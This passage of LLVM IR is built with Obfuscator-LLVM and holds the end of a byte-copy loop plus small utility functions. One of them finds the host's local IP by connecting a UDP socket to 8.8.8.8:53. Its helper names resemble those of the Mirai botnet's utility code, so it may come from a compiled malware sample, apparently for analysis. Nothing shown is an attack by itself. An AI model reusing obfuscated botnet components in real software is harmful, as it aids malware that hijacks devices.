  %ind.end11 = getelementptr i8, i8* %0, i64 %n.vec
  %cast.crd = trunc i64 %n.vec to i32
  %ind.end13 = sub i32 %2, %cast.crd
  br i1 %memcheck.conflict, label %.lr.ph.preheader19, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %11 = add nsw i64 %n.vec, -32
  %12 = lshr exact i64 %11, 5
  %13 = add nuw nsw i64 %12, 1
  %xtraiter20 = and i64 %13, 3
  %lcmp.mod21 = icmp eq i64 %xtraiter20, 0
  br i1 %lcmp.mod21, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter22 = phi i64 [ %prol.iter22.sub, %vector.body.prol ], [ %xtraiter20, %vector.body.prol.preheader ]
  %next.gep.prol = getelementptr i8, i8* %1, i64 %index.prol
  %next.gep15.prol = getelementptr i8, i8* %0, i64 %index.prol
  %14 = bitcast i8* %next.gep.prol to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %14, align 1, !alias.scope !18
  %15 = getelementptr i8, i8* %next.gep.prol, i64 16
  %16 = bitcast i8* %15 to <16 x i8>*
  %wide.load18.prol = load <16 x i8>, <16 x i8>* %16, align 1, !alias.scope !18
  %17 = bitcast i8* %next.gep15.prol to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %17, align 1, !alias.scope !21, !noalias !18
  %18 = getelementptr i8, i8* %next.gep15.prol, i64 16
  %19 = bitcast i8* %18 to <16 x i8>*
  store <16 x i8> %wide.load18.prol, <16 x i8>* %19, align 1, !alias.scope !21, !noalias !18
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter22.sub = add i64 %prol.iter22, -1
  %prol.iter22.cmp = icmp eq i64 %prol.iter22.sub, 0
  br i1 %prol.iter22.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !23

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %20 = icmp ult i64 %11, 96
  br i1 %20, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %next.gep = getelementptr i8, i8* %1, i64 %index
  %next.gep15 = getelementptr i8, i8* %0, i64 %index
  %21 = bitcast i8* %next.gep to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %21, align 1, !alias.scope !18
  %22 = getelementptr i8, i8* %next.gep, i64 16
  %23 = bitcast i8* %22 to <16 x i8>*
  %wide.load18 = load <16 x i8>, <16 x i8>* %23, align 1, !alias.scope !18
  %24 = bitcast i8* %next.gep15 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %24, align 1, !alias.scope !21, !noalias !18
  %25 = getelementptr i8, i8* %next.gep15, i64 16
  %26 = bitcast i8* %25 to <16 x i8>*
  store <16 x i8> %wide.load18, <16 x i8>* %26, align 1, !alias.scope !21, !noalias !18
  %index.next = add i64 %index, 32
  %next.gep.1 = getelementptr i8, i8* %1, i64 %index.next
  %next.gep15.1 = getelementptr i8, i8* %0, i64 %index.next
  %27 = bitcast i8* %next.gep.1 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %27, align 1, !alias.scope !18
  %28 = getelementptr i8, i8* %next.gep.1, i64 16
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load18.1 = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !18
  %30 = bitcast i8* %next.gep15.1 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %30, align 1, !alias.scope !21, !noalias !18
  %31 = getelementptr i8, i8* %next.gep15.1, i64 16
  %32 = bitcast i8* %31 to <16 x i8>*
  store <16 x i8> %wide.load18.1, <16 x i8>* %32, align 1, !alias.scope !21, !noalias !18
  %index.next.1 = add i64 %index, 64
  %next.gep.2 = getelementptr i8, i8* %1, i64 %index.next.1
  %next.gep15.2 = getelementptr i8, i8* %0, i64 %index.next.1
  %33 = bitcast i8* %next.gep.2 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %33, align 1, !alias.scope !18
  %34 = getelementptr i8, i8* %next.gep.2, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  %wide.load18.2 = load <16 x i8>, <16 x i8>* %35, align 1, !alias.scope !18
  %36 = bitcast i8* %next.gep15.2 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %36, align 1, !alias.scope !21, !noalias !18
  %37 = getelementptr i8, i8* %next.gep15.2, i64 16
  %38 = bitcast i8* %37 to <16 x i8>*
  store <16 x i8> %wide.load18.2, <16 x i8>* %38, align 1, !alias.scope !21, !noalias !18
  %index.next.2 = add i64 %index, 96
  %next.gep.3 = getelementptr i8, i8* %1, i64 %index.next.2
  %next.gep15.3 = getelementptr i8, i8* %0, i64 %index.next.2
  %39 = bitcast i8* %next.gep.3 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !18
  %40 = getelementptr i8, i8* %next.gep.3, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load18.3 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !18
  %42 = bitcast i8* %next.gep15.3 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %42, align 1, !alias.scope !21, !noalias !18
  %43 = getelementptr i8, i8* %next.gep15.3, i64 16
  %44 = bitcast i8* %43 to <16 x i8>*
  store <16 x i8> %wide.load18.3, <16 x i8>* %44, align 1, !alias.scope !21, !noalias !18
  %index.next.3 = add i64 %index, 128
  %45 = icmp eq i64 %index.next.3, %n.vec
  br i1 %45, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !24

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %7, %n.vec
  br i1 %cmp.n, label %._crit_edge, label %.lr.ph.preheader19

.lr.ph.preheader19:                               ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.lr.ph.preheader
  %.08.ph = phi i8* [ %1, %vector.memcheck ], [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.047.ph = phi i8* [ %0, %vector.memcheck ], [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end11, %middle.block ]
  %.056.ph = phi i32 [ %2, %vector.memcheck ], [ %2, %min.iters.checked ], [ %2, %.lr.ph.preheader ], [ %ind.end13, %middle.block ]
  %46 = add i32 %.056.ph, -1
  %xtraiter = and i32 %.056.ph, 7
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader19
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.08.prol = phi i8* [ %48, %.lr.ph.prol ], [ %.08.ph, %.lr.ph.prol.preheader ]
  %.047.prol = phi i8* [ %50, %.lr.ph.prol ], [ %.047.ph, %.lr.ph.prol.preheader ]
  %.056.prol = phi i32 [ %47, %.lr.ph.prol ], [ %.056.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %47 = add nsw i32 %.056.prol, -1
  %48 = getelementptr inbounds i8, i8* %.08.prol, i64 1
  %49 = load i8, i8* %.08.prol, align 1
  %50 = getelementptr inbounds i8, i8* %.047.prol, i64 1
  store i8 %49, i8* %.047.prol, align 1
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !25

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader19, %.lr.ph.prol.loopexit.unr-lcssa
  %.08.unr = phi i8* [ %.08.ph, %.lr.ph.preheader19 ], [ %48, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.047.unr = phi i8* [ %.047.ph, %.lr.ph.preheader19 ], [ %50, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.056.unr = phi i32 [ %.056.ph, %.lr.ph.preheader19 ], [ %47, %.lr.ph.prol.loopexit.unr-lcssa ]
  %51 = icmp ult i32 %46, 7
  br i1 %51, label %._crit_edge.loopexit, label %.lr.ph.preheader19.new

.lr.ph.preheader19.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader19.new
  %.08 = phi i8* [ %.08.unr, %.lr.ph.preheader19.new ], [ %74, %.lr.ph ]
  %.047 = phi i8* [ %.047.unr, %.lr.ph.preheader19.new ], [ %76, %.lr.ph ]
  %.056 = phi i32 [ %.056.unr, %.lr.ph.preheader19.new ], [ %73, %.lr.ph ]
  %52 = getelementptr inbounds i8, i8* %.08, i64 1
  %53 = load i8, i8* %.08, align 1
  %54 = getelementptr inbounds i8, i8* %.047, i64 1
  store i8 %53, i8* %.047, align 1
  %55 = getelementptr inbounds i8, i8* %.08, i64 2
  %56 = load i8, i8* %52, align 1
  %57 = getelementptr inbounds i8, i8* %.047, i64 2
  store i8 %56, i8* %54, align 1
  %58 = getelementptr inbounds i8, i8* %.08, i64 3
  %59 = load i8, i8* %55, align 1
  %60 = getelementptr inbounds i8, i8* %.047, i64 3
  store i8 %59, i8* %57, align 1
  %61 = getelementptr inbounds i8, i8* %.08, i64 4
  %62 = load i8, i8* %58, align 1
  %63 = getelementptr inbounds i8, i8* %.047, i64 4
  store i8 %62, i8* %60, align 1
  %64 = getelementptr inbounds i8, i8* %.08, i64 5
  %65 = load i8, i8* %61, align 1
  %66 = getelementptr inbounds i8, i8* %.047, i64 5
  store i8 %65, i8* %63, align 1
  %67 = getelementptr inbounds i8, i8* %.08, i64 6
  %68 = load i8, i8* %64, align 1
  %69 = getelementptr inbounds i8, i8* %.047, i64 6
  store i8 %68, i8* %66, align 1
  %70 = getelementptr inbounds i8, i8* %.08, i64 7
  %71 = load i8, i8* %67, align 1
  %72 = getelementptr inbounds i8, i8* %.047, i64 7
  store i8 %71, i8* %69, align 1
  %73 = add nsw i32 %.056, -8
  %74 = getelementptr inbounds i8, i8* %.08, i64 8
  %75 = load i8, i8* %70, align 1
  %76 = getelementptr inbounds i8, i8* %.047, i64 8
  store i8 %75, i8* %72, align 1
  %77 = icmp eq i32 %73, 0
  br i1 %77, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !26

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %middle.block, %3
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_zero(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -1
  %5 = zext i32 %4 to i64
  %6 = add nuw nsw i64 %5, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 0, i64 %6, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph.preheader, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  store i32 16, i32* %2, align 4
  %3 = tail call i32* @__errno_location() #12
  store i32 0, i32* %3, align 4
  %4 = tail call i32 @socket(i32 2, i32 2, i32 0) #8
  %5 = icmp eq i32 %4, -1
  br i1 %5, label %17, label %6

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %7, align 4
  %8 = tail call i32 @htonl(i32 134744072) #12
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %8, i32* %9, align 4
  %10 = tail call zeroext i16 @htons(i16 zeroext 53) #12
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %10, i16* %11, align 2
  %12 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %13 = call i32 @connect(i32 %4, %struct.sockaddr* nonnull %12, i32 16) #8
  %14 = call i32 @getsockname(i32 %4, %struct.sockaddr* nonnull %12, i32* nonnull %2) #8
  %15 = call i32 @close(i32 %4) #8
  %16 = load i32, i32* %9, align 4
  br label %17

; <label>:17:                                     ; preds = %0, %6
  %.0 = phi i32 [ %16, %6 ], [ 0, %0 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #12

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind }
attributes #9 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { nounwind readnone }
attributes #13 = { nounwind readonly }
attributes #14 = { noreturn nounwind }
attributes #15 = { cold }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = distinct !{!4, !2, !3}
!5 = distinct !{!5, !6, !2, !3}
!6 = !{!"llvm.loop.unroll.runtime.disable"}
!7 = !{i32 -2146836174}
!8 = !{i32 -2146835765}
!9 = distinct !{!9, !2, !3}
!10 = distinct !{!10, !11}
!11 = !{!"llvm.loop.unroll.disable"}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146836302}
!14 = !{i32 -2146835893}
!15 = distinct !{!15, !2, !3}
!16 = distinct !{!16, !11}
!17 = distinct !{!17, !2, !3}
!18 = !{!19}
!19 = distinct !{!19, !20}
!20 = distinct !{!20, !"LVerDomain"}
!21 = !{!22}
!22 = distinct !{!22, !20}
!23 = distinct !{!23, !11}
!24 = distinct !{!24, !2, !3}
!25 = distinct !{!25, !11}
!26 = distinct !{!26, !2, !3}
